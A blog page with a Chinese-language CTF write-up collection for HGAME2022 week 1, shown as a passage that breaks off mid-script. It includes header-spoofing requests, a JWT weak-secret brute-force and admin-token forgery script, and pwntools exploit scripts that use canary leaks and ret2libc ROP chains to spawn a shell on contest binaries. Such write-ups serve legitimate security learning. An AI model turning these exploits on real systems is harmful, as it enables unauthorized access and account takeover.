<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='战队成员 wp 合集'><title>HGAME2022 Writeup by or4nge</title>

<link rel='canonical' href='https://or4ngesec.github.io/post/hgame2022-writeup-by-or4nge/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='HGAME2022 Writeup by or4nge'>
<meta property='og:description' content='战队成员 wp 合集'>
<meta property='og:url' content='https://or4ngesec.github.io/post/hgame2022-writeup-by-or4nge/'>
<meta property='og:site_name' content='or4nge'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Writeup' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Pwn' /><meta property='article:tag' content='Reverse' /><meta property='article:tag' content='Crypto' /><meta property='article:tag' content='Misc' /><meta property='article:tag' content='HGAME' /><meta property='article:published_time' content='2022-02-25T22:32:31&#43;08:00'/><meta property='article:modified_time' content='2022-03-01T22:03:31&#43;08:00'/>
<meta name="twitter:title" content="HGAME2022 Writeup by or4nge">
<meta name="twitter:description" content="战队成员 wp 合集">
    </head>
    <body class="
    article-page has-toc
">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex 
    
        extended
    
">
    
        <div id="article-toolbar">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>Back</span>
            </a>
        </div>
    
<main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf/" >
                CTF
            </a>
        
            <a href="/categories/writeup/" >
                Writeup
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/post/hgame2022-writeup-by-or4nge/">HGAME2022 Writeup by or4nge</a>
    </h2>

    
    <h3 class="article-subtitle">
        战队成员 wp 合集
    </h3>
    

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Feb 25, 2022</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    43 minute read
                </time>
            </div>
        
    </footer>
    
</div>
</header>

    <section class="article-content">
    <h2 id="week1">week1</h2>
<h3 id="webfujiwara-tofu-shop">[Web]Fujiwara Tofu Shop</h3>
<blockquote>
<p>By SSGSS</p>
</blockquote>
<p>一个个改请求头就 ok</p>
<pre tabindex="0"><code>GET / HTTP/1.1
Host: game.summ3r.top
User-Agent: Hachi-Roku
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Gasoline: 100
Cookie: flavor=Raspberry;
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Referer: qiumingshan.net
X-Real-IP: 127.0.0.1
</code></pre><h3 id="webtetris-plus">[Web]Tetris plus</h3>
<blockquote>
<p>By SSGSS</p>
</blockquote>
<p>一个个翻 js，长度最长的那个用 js 运行一下就是 flag</p>
<h3 id="web蛛蛛嘿嘿我的蛛蛛">[Web]蛛蛛&hellip;嘿嘿♥我的蛛蛛</h3>
<blockquote>
<p>By SSGSS</p>
</blockquote>
<p>爬虫题</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> re
url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://hgame-spider.vidar.club/b7412bb0b0&#39;</span>
now <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;?key=M7H8z1oG%2B1SaPudvsDf7GEm</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">9hyalx2liQ6X2mBSz4iXDqmZwkyLTWPY02GWc5OZf</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">9zO73pRTg3XdoyjfgY3g%3D%3D&#39;</span>

<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> now)
    <span style="color:#66d9ef">try</span>:
        now <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\?key=.*?&#34;&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>][:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
    <span style="color:#66d9ef">except</span>:
        print(now)
        <span style="color:#66d9ef">break</span>
</code></pre></div><p>到最后一关查看 header 就有 flag</p>
<h3 id="webeasy_auth">[Web]easy_auth</h3>
<blockquote>
<p>By SSGSS</p>
</blockquote>
<p>根据题目描述要 admin 登进去，阅读 <code>app.js</code> 代码发现是用 jwt 进行的身份认证，介于是 week1 的简单题，没必要想的那么复杂，先尝试把 algorithm 改成 None 后无效，那就爆弱口令密钥，网上找了个 top10000，脚本如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> jwt
jwt_str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6MzUwLCJVc2VyTmFtZSI6ImFkbWluJyBvciAxMDAwMD0xMDAwMCMiLCJQaG9uZSI6IiIsIkVtYWlsIjoiIiwiZXhwIjoxNjQyNzMyMTQ1LCJpc3MiOiJNSmNsb3VkcyJ9._VVQjP4wTBYNes1cWiIaNTTidLwirfaFA9pnqsC-eQ8&#39;</span>

fp <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;弱口令top10000.txt&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>)

<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> fp<span style="color:#f92672">.</span>readlines():
    line <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
    <span style="color:#75715e"># print(line)</span>
    <span style="color:#66d9ef">try</span>:
        jwt<span style="color:#f92672">.</span>decode(jwt_str, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, key<span style="color:#f92672">=</span>line)
        print(line)
        print(len(line))
        <span style="color:#66d9ef">break</span>
    <span style="color:#66d9ef">except</span> (jwt<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>ExpiredSignatureError, jwt<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>InvalidAudienceError, jwt<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>InvalidIssuedAtError, jwt<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>InvalidIssuedAtError, jwt<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>ImmatureSignatureError):
        print(line)
        <span style="color:#66d9ef">break</span>
    <span style="color:#66d9ef">except</span> jwt<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>InvalidSignatureError:
        <span style="color:#66d9ef">continue</span>
</code></pre></div><p>爆出来密钥为空，所以伪造 jwt:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">dict <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;ID&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;UserName&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;Phone&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;Email&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;exp&#34;</span>:<span style="color:#ae81ff">1642732145</span>,<span style="color:#e6db74">&#34;iss&#34;</span>:<span style="color:#e6db74">&#34;MJclouds&#34;</span>}
print(jwt<span style="color:#f92672">.</span>encode(dict, <span style="color:#e6db74">&#39;&#39;</span>, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;HS256&#39;</span>))
</code></pre></div><p>然后到控制台里把 token 改了就能拿 flag 了。<code>localStorage.setItem('token',value)</code></p>
<h3 id="pwngdb">[Pwn]gdb</h3>
<blockquote>
<p>By triplewings</p>
</blockquote>
<ul>
<li>触发 gets 漏洞，拿到 shell</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
<span style="color:#75715e"># p = remote(&#34;chuj.top&#34;, 50684)</span>
p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./a.out&#34;</span>)
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;word&#34;</span>)

payload <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xb0361e0e8294f147</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x8c09e0c34ed8a6a9</span>)

p<span style="color:#f92672">.</span>send(payload)

p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)
p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">2</span>)
canary <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>))
print(hex(canary))
p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> p64(canary) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x401256</span>))
p<span style="color:#f92672">.</span>interactive()
</code></pre></div><h3 id="pwnenter_the_pwn_land">[Pwn]enter_the_pwn_land</h3>
<blockquote>
<p>By triplewings</p>
</blockquote>
<ul>
<li>baby rop，改 puts</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)

p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./a.out&#34;</span>)
<span style="color:#75715e"># p = remote(&#34;chuj.top&#34;, 31470)</span>
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;libc-2.31.so&#34;</span>)

pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401313</span>
pop_rsi_r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401311</span>
puts_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404020</span>
puts_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401090</span>

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(puts_got) <span style="color:#f92672">+</span> p64(puts_plt) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x4011B6</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
<span style="color:#75715e"># gdb.attach(p, &#34;b *0x4011B6&#34;)</span>
p<span style="color:#f92672">.</span>send(payload)
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))  <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;puts&#34;</span>]
print(hex(libc<span style="color:#f92672">.</span>address))

sh <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)<span style="color:#f92672">.</span>__next__()
system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;execv&#39;</span>]

payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;b&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(pop_rsi_r15) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span>p64(pop_rdi) <span style="color:#f92672">+</span> p64(sh) <span style="color:#f92672">+</span>p64(system) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>

p<span style="color:#f92672">.</span>send(payload2)

p<span style="color:#f92672">.</span>interactive()
</code></pre></div><h3 id="pwnenter_the_evil_pwn_land">[Pwn]enter_the_evil_pwn_land</h3>
<blockquote>
<p>By triplewings</p>
</blockquote>
<ul>
<li>利用多线程 canary 和 tls 离 stack 近的特点覆盖 canary</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)

p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./a.out&#34;</span>)
<span style="color:#75715e"># p = remote(&#34;chuj.top&#34;, 31470)</span>
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;libc-2.31.so&#34;</span>)

pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401313</span>
pop_rsi_r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401311</span>
puts_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404020</span>
puts_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401090</span>

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(puts_got) <span style="color:#f92672">+</span> p64(puts_plt) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x4011B6</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
<span style="color:#75715e"># gdb.attach(p, &#34;b *0x4011B6&#34;)</span>
p<span style="color:#f92672">.</span>send(payload)
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))  <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;puts&#34;</span>]
print(hex(libc<span style="color:#f92672">.</span>address))

sh <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)<span style="color:#f92672">.</span>__next__()
system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;execv&#39;</span>]

payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;b&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(pop_rsi_r15) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span>p64(pop_rdi) <span style="color:#f92672">+</span> p64(sh) <span style="color:#f92672">+</span>p64(system) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>

p<span style="color:#f92672">.</span>send(payload2)

p<span style="color:#f92672">.</span>interactive()
</code></pre></div><h3 id="pwnoldfashion_orw">[Pwn]oldfashion_orw</h3>
<blockquote>
<p>By triplewings</p>
</blockquote>
<ul>
<li>ban 了 openat，用 getsdent64 读取目录，然后正常 orw</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;vuln&#34;</span>)
p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chuj.top&#34;</span>, <span style="color:#ae81ff">41765</span>)
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;libc-2.31.so&#34;</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">proof</span>(y):
    may <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>digits
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> may:
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> may:
            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> may:
                <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> may:
                    res <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span>j <span style="color:#f92672">+</span>k <span style="color:#f92672">+</span>l
                    <span style="color:#66d9ef">if</span> hashlib<span style="color:#f92672">.</span>sha256((res)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> y:
                        p<span style="color:#f92672">.</span>sendline(res)
                        <span style="color:#66d9ef">return</span>
    print(<span style="color:#e6db74">&#39;Wrong!&#39;</span>)


p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; == &#34;</span>)
a <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
print(a)
proof(a)

p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;size?&#34;</span>)

p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;-1&#34;</span>)

p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;content?&#34;</span>)

<span style="color:#75715e"># gdb.attach(p, &#34;b *0x401311&#34;)</span>

pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401443</span>
pop_rsi_r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401441</span>
write_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404018</span>
write_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401080</span>

main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401311</span>
leave <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4013DB</span>
read_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4010A0</span>
bss <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404060</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xffffffffffffffff</span>) <span style="color:#f92672">+</span> p64(bss)
payload <span style="color:#f92672">+=</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(pop_rsi_r15) <span style="color:#f92672">+</span> p64(bss) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(read_plt) <span style="color:#f92672">+</span> p64(main)
p<span style="color:#f92672">.</span>send(payload)
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;done!&#34;</span>)
payload2 <span style="color:#f92672">=</span> p32(main) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
p<span style="color:#f92672">.</span>send(payload2)
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;size?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)

p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-1&#34;</span>)

p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;content?&#34;</span>)

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xffffffffffffffff</span>) <span style="color:#f92672">+</span> p64(bss<span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>)
payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15) <span style="color:#f92672">+</span> p64(write_got) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(write_plt) <span style="color:#f92672">+</span> p64(leave) <span style="color:#f92672">+</span> p64(main)


p<span style="color:#f92672">.</span>send(payload)

libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))  <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;write&#34;</span>]


print(hex(libc<span style="color:#f92672">.</span>address))

p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;size?&#34;</span>)

p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;-1&#34;</span>)

p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;content?&#34;</span>)

libc_pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000004a550</span>
libc_pop_rax_rdx_rbx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000162865</span>
